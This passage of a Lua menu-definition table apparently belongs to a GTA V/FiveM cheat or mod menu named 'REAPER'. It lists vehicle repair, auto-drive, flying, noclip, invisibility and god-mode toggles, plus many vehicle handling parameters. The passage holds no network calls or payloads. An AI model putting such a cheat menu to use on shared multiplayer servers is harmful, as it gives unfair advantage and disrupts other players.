-359, -358, -357, -356, -355, -354, -353, -352, -351, -350, -349, -348, -347, -346, -345, -344, -343, -342, -341, -340, -339, -338, -337, -336, -335, -334, -333, -332, -331, -330, -329, -328, -327, -326, -325, -324, -323, -322, -321, -320, -319, -318, -317, -316, -315, -314, -313, -312, -311, -310, -309, -308, -307, -306, -305, -304, -303, -302, -301, -300, -299, -298, -297, -296, -295, -294, -293, -292, -291, -290, -289, -288, -287, -286, -285, -284, -283, -282, -281, -280, -279, -278, -277, -276, -275, -274, -273, -272, -271, -270, -269, -268, -267, -266, -265, -264, -263, -262, -261, -260, -259, -258, -257, -256, -255, -254, -253, -252, -251, -250, -249, -248, -247, -246, -245, -244, -243, -242, -241, -240, -239, -238, -237, -236, -235, -234, -233, -232, -231, -230, -229, -228, -227, -226, -225, -224, -223, -222, -221, -220, -219, -218, -217, -216, -215, -214, -213, -212, -211, -210, -209, -208, -207, -206, -205, -204, -203, -202, -201, -200, -199, -198, -197, -196, -195, -194, -193, -192, -191, -190, -189, -188, -187, -186, -185, -184, -183, -182, -181, -180, -179, -178, -177, -176, -175, -174, -173, -172, -171, -170, -169, -168, -167, -166, -165, -164, -163, -162, -161, -160, -159, -158, -157, -156, -155, -154, -153, -152, -151, -150, -149, -148, -147, -146, -145, -144, -143, -142, -141, -140, -139, -138, -137, -136, -135, -134, -133, -132, -131, -130, -129, -128, -127, -126, -125, -124, -123, -122, -121, -120, -119, -118, -117, -116, -115, -114, -113, -112, -111, -110, -109, -108, -107, -106, -105, -104, -103, -102, -101, -100, -99, -98, -97, -96, -95, -94, -93, -92, -91, -90, -89, -88, -87, -86, -85, -84, -83, -82, -81, -80, -79, -78, -77, -76, -75, -74, -73, -72, -71, -70, -69, -68, -67, -66, -65, -64, -63, -62, -61, -60, -59, -58, -57, -56, -55, -54, -53, -52, -51, -50, -49, -48, -47, -46, -45, -44, -43, -42, -41, -40, -39, -38, -37, -36, -35, -34, -33, -32, -31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17, -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000}},
            {text = 'Body health', dkey = 'vehicle:fixing_bodyhealth', desc = 'Set the vehicle\'s body health.', afu = __REAPER1__.M.vehicle.fixing.bodyhealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Body health number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Vehicle', option = __REAPER1__.M.Separator},
            {text = 'Fix vehicle', dkey = 'vehicle:fixing_fixvehicle', desc = 'Fix the whole vehicle.', afu = __REAPER1__.M.vehicle.fixing.vehicle, option = __REAPER1__.M.Button},
            {text = 'Auto fix vehicle', dkey = 'vehicle:fixing_autofixvehicle', desc = 'Automatically fix the vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Deformation', option = __REAPER1__.M.Separator},
            {text = 'Fix deformation', dkey = 'vehicle:fixing_fixdeformation', desc = 'Fix the vehicle deformation.', afu = __REAPER1__.M.vehicle.fixing.deformation, option = __REAPER1__.M.Button},
            {text = 'Auto fix deformation', dkey = 'vehicle:fixing_autofixdeformation', desc = 'Automatically fix the vehicle\ndeformation.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Windows', option = __REAPER1__.M.Separator},
            {text = 'Fix windows', dkey = 'vehicle:fixing_fixwindows', desc = 'Fix the vehicle windows.', afu = __REAPER1__.M.vehicle.fixing.windows, option = __REAPER1__.M.Button},
            {text = 'Auto fix windows', dkey = 'vehicle:fixing_autofixwindows', desc = 'Autoamtically fix the vehicle windows.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Tires', option = __REAPER1__.M.Separator},
            {text = 'Fix tires', dkey = 'vehicle:fixing_fixtires', desc = 'Fix the vehicle tires.', afu = __REAPER1__.M.vehicle.fixing.tires, option = __REAPER1__.M.Button},
            {text = 'Auto fix tires', dkey = 'vehicle:fixing_autofixtires', desc = 'Automatically fix the vehicle tires.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['vehicle:movement'] = {
            {text = 'Auto drive', dkey = 'vehicle:movement_autodrive', desc = 'Automatically drive the vehicle you\nare sitting in.', afu = __REAPER1__.M.vehicle.movement.autodrive, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Drive to waypoint', dkey = 'vehicle:movement_drivetowaypoint', desc = 'Auto drive to your waypoint.', afu = __REAPER1__.M.vehicle.movement.drivetowp, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Sticky car', dkey = 'vehicle:movement_stickycar', desc = 'Stick the vehicle to the surface you\nare driving on.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Always wheelie', dkey = 'vehicle:movement_alwayswheelie', desc = 'Set a wheelie status on your vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Bunny hop', dkey = 'vehicle:movement_bunnyhop', desc = 'Press space to bunny hop with the vehicle.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Engine', option = __REAPER1__.M.Separator},
            {text = 'Easy handling', dkey = 'vehicle:movement_easyhandling', desc = 'Make the vehicle easily driveable.', afu = __REAPER1__.M.vehicle.movement.easyhandling, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Cruise (km/h)', dkey = 'vehicle:movement_maxspeed', desc = 'Set the vehicle\'s maximum speed in\nkm/h.', afu = __REAPER1__.M.vehicle.movement.maxspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle max speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set speed (km/h)', dkey = 'vehicle:movement_setspeed', desc = 'Set the vehicle\'s current speed in\nkm/h.', afu = __REAPER1__.M.vehicle.movement.setspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Top speed', dkey = 'vehicle:movement_topspeed', desc = 'Set the vehicle\'s top speed.', afu = __REAPER1__.M.vehicle.movement.topspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle top speed number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Torque multipleir', dkey = 'vehicle:movement_torque', desc = 'Set a torque multiplier. 1 is default.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Torque multiplier number', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Rounds per minute', dkey = 'vehicle:movement_rpm', desc = 'Modify the vehicle\'s rounds per minute\nmultiplied by ten.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle RPM number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.EzresNullaval},
            {text = 'Horn boost', dkey = 'vehicle:movement_hornboost', desc = 'Toggle the horn boost.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Horn boost number', length = 4, tipus = 'szam', toggle = false, func = __REAPER1__.T.Ezres},
            {text = 'Flip', option = __REAPER1__.M.Separator},
            {text = 'Flip vehicle', dkey = 'vehicle:movement_flipvehicle', desc = 'Flip the vehicle up.', afu = __REAPER1__.M.vehicle.movement.flip, option = __REAPER1__.M.Button},
            {text = 'Auto flip', dkey = 'vehicle:movement_autoflip', desc = 'Automatically flip the vehicle if it\'s\nupside down.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Only in air', dkey = 'vehicle:movement_onlyinair', desc = 'Only flip the vehicle if it\'s in air.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Flying', option = __REAPER1__.M.Separator},
            {text = 'Flying', dkey = 'vehicle:movement_flying', desc = 'Enable flying.', afu = __REAPER1__.M.vehicle.movement.flying, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Speed', dkey = 'vehicle:movement_wspeed', desc = 'Flying speed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Flying speed number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Extra', dkey = 'vehicle:movement_wextra', desc = 'Extras while flying.', afu = __REAPER1__.M.vehicle.movement.wextra, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Flying extra name', length = 20, tipus = 'betu', func = {'None', 'Invisible', 'God', 'Invisible & God'}},
            {text = 'Lagging', dkey = 'vehicle:movement_wlagging', desc = 'Enable lag while flying.\nMore precise.', afu = __REAPER1__.M.vehicle.movement.wlagging, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Noclip', option = __REAPER1__.M.Separator},
            {text = 'Noclip', dkey = 'vehicle:movement_noclip', desc = 'Enable noclip.', afu = __REAPER1__.M.vehicle.movement.noclip, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Speed', dkey = 'vehicle:movement_nspeed', desc = 'Noclip speed.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Noclip speed number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Extra', dkey = 'vehicle:movement_nextra', desc = 'Extras while noclipping.', afu = __REAPER1__.M.vehicle.movement.extra, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Noclipping extra name', length = 20, tipus = 'betu', func = {'None', 'Invisible', 'God', 'Invisible & God'}},
            {text = 'Lagging', dkey = 'vehicle:movement_nlagging', desc = 'Enable lag while noclipping.\nMore precise.', afu = __REAPER1__.M.vehicle.movement.lagging, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['vehicle:handling'] = {
            {text = 'fMass',                           extra = 'fMass',                            dkey = 'vehicle:handling_fmass', desc = 'This is the weight of the vehicle in\nkilograms.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fmass number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fInitialDragCoeff',               extra = 'fInitialDragCoeff',                dkey = 'vehicle:handling_finitialdragcoeff', desc = 'Sets the drag coefficient on the rage\nphysics archetype of the vehicle.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling finitialdragcoeff number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fPercentSubmerged',               extra = 'fPercentSubmerged',                dkey = 'vehicle:handling_fpercentsubmerged', desc = 'A percentage of vehicle height in the\nwater before vehicle "floats".', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fpercentsubmerged number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'vecCentreOfMassOffset',           extra = 'vecCentreOfMassOffset',            dkey = 'vehicle:handling_veccentreofmassoffset', desc = 'This value shifts the center of gravity in\nmeters from side to side.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling veccentreofmassoffset number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'vecInertiaMultiplier',            extra = 'vecInertiaMultiplier',             dkey = 'vehicle:handling_vecinertiamultiplier', desc = 'This value affects the ease with which\nthe vehicle spins around each axis.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling vecinertiamultiplier number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fDriveBiasFront',                 extra = 'fDriveBiasFront',                  dkey = 'vehicle:handling_fdrivebiasfront', desc = 'This value is used to determine whether\na vehicle is front, rear, or four wheel drive.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fdrivebiasfront number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'nInitialDriveGears',              extra = 'nInitialDriveGears',               dkey = 'vehicle:handling_ninitialdrivegears', desc = 'How many forward speeds a transmission\ncontains.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ninitialdrivegears number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fInitialDriveForce',              extra = 'fInitialDriveForce',               dkey = 'vehicle:handling_finitialdriveforce', desc = 'This multiplier modifies the game\'s\ncalculation of drive force.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling finitialdriveforce number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fDriveInertia',                   extra = 'fDriveInertia',                    dkey = 'vehicle:handling_fdriveinertia', desc = 'Describes how fast an engine will revive.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fdriveinertia number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fClutchChangeRateScaleUpShift',   extra = 'fClutchChangeRateScaleUpShift',    dkey = 'vehicle:handling_fclutchchangeratescaleupshift', desc = 'Clutch speed multiplier on up shifts.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fclutchchangeratescaleupshift number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fClutchChangeRateScaleDownShift', extra = 'fClutchChangeRateScaleDownShift',  dkey = 'vehicle:handling_fclutchchangeratescaledownshift', desc = 'Clutch speed multiplier on down shifts.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fclutchchangeratescaledownshift number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fInitialDriveMaxFlatVel',         extra = 'fInitialDriveMaxFlatVel',          dkey = 'vehicle:handling_finitialdrivemaxflatvel', desc = 'Determines the speed at redline in top\ngear.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling finitialdrivemaxflatvel number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fBrakeForce',                     extra = 'fBrakeForce',                      dkey = 'vehicle:handling_fbrakeforce', desc = 'Multiplies the game\'s calculation of\ndeceleration.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fbrakeforce number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fBrakeBiasFront',                 extra = 'fBrakeBiasFront',                  dkey = 'vehicle:handling_fbrakebiasfront', desc = 'This controls the distribution of braking\nforce between the front and rear axles.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fbrakebiasfront number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fHandBrakeForce',                 extra = 'fHandBrakeForce',                  dkey = 'vehicle:handling_fhandbrakeforce', desc = 'Braking power for handbrake.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fhandbrakeforce number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSteeringLock',                   extra = 'fSteeringLock',                    dkey = 'vehicle:handling_fsteeringlock', desc = 'Steering lock is directly related to over\nor understeer / turning radius.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsteeringlock number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fTractionCurveMax',               extra = 'fTractionCurveMax',                dkey = 'vehicle:handling_ftractioncurvemax', desc = 'Cornering grip of the vehicle as a\nmultiplier of the tire surface friction.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ftractioncurvemax number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fTractionCurveMin',               extra = 'fTractionCurveMin',                dkey = 'vehicle:handling_ftractioncurvemin', desc = 'Accelerating/braking grip of the\nvehicle as a multiplier of the tire surface\nfriction.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ftractioncurvemin number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fTractionCurveLateral',           extra = 'fTractionCurveLateral',            dkey = 'vehicle:handling_ftractioncurvelateral', desc = 'Shape of lateral traction curve.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ftractioncurvelateral number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fTractionSpringDeltaMax',         extra = 'fTractionSpringDeltaMax',          dkey = 'vehicle:handling_ftractionspringdeltamax', desc = 'This value denotes at what distance\nabove the ground the car will lose\ntraction.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ftractionspringdeltamax number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fLowSpeedTractionLossMult',       extra = 'fLowSpeedTractionLossMult',        dkey = 'vehicle:handling_flowspeedtractionlossmult', desc = 'How much traction is reduced at low\nspeed.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling flowspeedtractionlossmult number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fCamberStiffnesss',               extra = 'fCamberStiffnesss',                dkey = 'vehicle:handling_fcamberstiffnesss', desc = 'This value modify the grip of the car\nwhen you\'re drifting and you release the\ngas.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fcamberstiffnesss number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fTractionBiasFront',              extra = 'fTractionBiasFront',               dkey = 'vehicle:handling_ftractionbiasfront', desc = 'Determines the distribution of traction\nfrom front to rear.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ftractionbiasfront number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fTractionLossMult',               extra = 'fTractionLossMult',                dkey = 'vehicle:handling_ftractionlossmult', desc = 'How much is traction affected by\nmaterial grip differences.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling ftractionlossmult number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionForce',                extra = 'fSuspensionForce',                 dkey = 'vehicle:handling_fsuspensionforce', desc = 'Affects how strong suspension is.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensionforce number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionCompDamp',             extra = 'fSuspensionCompDamp',              dkey = 'vehicle:handling_fsuspensioncompdamp', desc = 'Damping during strut compression.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensioncompdamp number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionReboundDamp',          extra = 'fSuspensionReboundDamp',           dkey = 'vehicle:handling_fsuspensionrebounddamp', desc = 'Damping during strut rebound.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensionrebounddamp number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionUpperLimit',           extra = 'fSuspensionUpperLimit',            dkey = 'vehicle:handling_fsuspensionupperlimit', desc = 'How far can wheels move up / down\nfrom original position.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensionupperlimit number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionLowerLimit',           extra = 'fSuspensionLowerLimit',            dkey = 'vehicle:handling_fsuspensionlowerlimit', desc = 'How far can wheels move up / down\nfrom original position.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensionlowerlimit number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionRaise',                extra = 'fSuspensionRaise',                 dkey = 'vehicle:handling_fsuspensionraise', desc = 'The amount that the suspension raises\nthe body off the wheels.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensionraise number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fSuspensionBiasFront',            extra = 'fSuspensionBiasFront',             dkey = 'vehicle:handling_fsuspensionbiasfront', desc = 'Force damping scale front/back.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fsuspensionbiasfront number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fAntiRollBarForce',               extra = 'fAntiRollBarForce',                dkey = 'vehicle:handling_fantirollbarforce', desc = 'The spring constant that is transmitted\nto the opposite wheel when under\ncompression.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fantirollbarforce number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fAntiRollBarBiasFront',           extra = 'fAntiRollBarBiasFront',            dkey = 'vehicle:handling_fantirollbarbiasfront', desc = 'The bias between front and rear for\nthe antiroll bar.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fantirollbarbiasfront number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fRollCentreHeightFront',          extra = 'fRollCentreHeightFront',           dkey = 'vehicle:handling_frollcentreheightfront', desc = 'This value modify the weight transmission\nduring an acceleration between the left\nand right.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling frollcentreheightfront number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fRollCentreHeightRear',           extra = 'fRollCentreHeightRear',            dkey = 'vehicle:handling_frollcentreheightrear', desc = 'This value modify the weight transmission\nduring an acceleration between the front\nand rear.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling frollcentreheightrear number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fCollisionDamageMult',            extra = 'fCollisionDamageMult',             dkey = 'vehicle:handling_fcollisiondamagemult', desc = 'Multiplies the game\'s calculation of\ndamage to the vehicle through collision.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fcollisiondamagemult number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fWeaponDamageMult',               extra = 'fWeaponDamageMult',                dkey = 'vehicle:handling_fweapondamagemult', desc = 'Multiplies the game\'s calculation of\ndamage to the vehicle through weapon\ndamage.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fweapondamagemult number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fDeformationDamageMult',          extra = 'fDeformationDamageMult',           dkey = 'vehicle:handling_fdeformationdamagemult', desc = 'Multiplies the game\'s calculation of\ndeformation-causing damage.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fdeformationdamagemult number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fEngineDamageMult',               extra = 'fEngineDamageMult',                dkey = 'vehicle:handling_fenginedamagemult', desc = 'Multiplies the game\'s calculation of\ndamage to the engine, causing explosion\nor engine failure.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fenginedamagemult number', length = 30, tipus = 'vegyess', func = 'None'},
            {text = 'fPetrolTankVolume',               extra = 'fPetrolTankVolume',                dkey = 'vehicle:handling_fpetroltankvolume', desc = 'Amount of petrol that will leak after\nshooting the vehicle\'s petrol tank.', afu = __REAPER1__.M.vehicle.handling.handling, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Handling fpetroltankvolume number', length = 30, tipus = 'vegyess', func = 'None'},
